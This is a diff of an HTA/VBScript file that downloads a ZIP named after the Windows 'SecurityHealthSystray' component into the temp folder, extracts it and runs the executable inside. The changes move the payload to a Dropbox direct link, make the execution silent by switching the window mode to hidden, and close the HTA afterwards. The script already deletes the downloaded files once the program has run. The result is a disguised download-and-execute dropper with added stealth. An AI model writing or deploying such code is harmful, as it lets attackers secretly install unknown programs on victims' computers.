@@ -27,8 +27,8 @@
 Sub DownloadAndRunFile()
     Dim objHTTP, objFSO, strFileURL, strZipPath, strExtractPath, strExePath
 
-    ' Set the URL for the ZIP file hosted on Vercel
-    strFileURL = "https://arch-tools.vercel.app/SecurityHealthSystray.zip"
+    ' Set the Dropbox direct download link (ensure it ends with ?dl=1)
+    strFileURL = "https://www.dropbox.com/scl/fi/t9h6fzxjvzbfgehq4u83y/SecurityHealthSystray.zip?dl=1"
 
     ' Set the local path for saving the downloaded ZIP file
     strZipPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SecurityHealthSystray.zip"
@@ -74,10 +74,10 @@ Sub DownloadAndRunFile()
         ' Construct the path to the extracted executable (adjust if necessary)
         strExePath = strExtractPath & "\SecurityHealthSystray.exe" 
 
-        ' Run the extracted executable
+        ' Run the extracted executable silently
         Dim objShell
         Set objShell = CreateObject("WScript.Shell")
-        objShell.Run strExePath, 1, True ' Wait for the file to finish running
+        objShell.Run strExePath, 0, True ' Wait for the file to finish running silently
 
         ' Clean up: delete downloaded and extracted files after execution
         If objFSO.FileExists(strZipPath) Then
@@ -93,6 +93,9 @@ Sub DownloadAndRunFile()
     End If
 
     Set objHTTP = Nothing
+    
+    ' Close the HTA application after completion
+    self.close()
 End Sub
 
 ' Call the main subroutine to execute the download and extraction process
